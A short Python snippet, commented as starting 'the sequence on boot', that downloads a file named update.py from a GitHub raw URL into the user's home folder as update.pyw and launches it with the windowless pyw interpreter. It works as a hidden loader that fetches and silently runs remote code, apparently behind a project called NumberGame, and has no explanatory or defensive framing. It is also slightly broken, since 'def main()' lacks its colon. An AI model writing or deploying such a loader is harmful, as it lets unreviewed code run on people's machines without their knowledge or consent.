#starts the sequence on boot
def main()
    import os, urllib.request, subprocess
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
    home = os.path.expanduser("~")
    os.chdir(home)
    path = str(home) + '/update.pyw'
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    subprocess.Popen(['pyw', 'update.pyw'])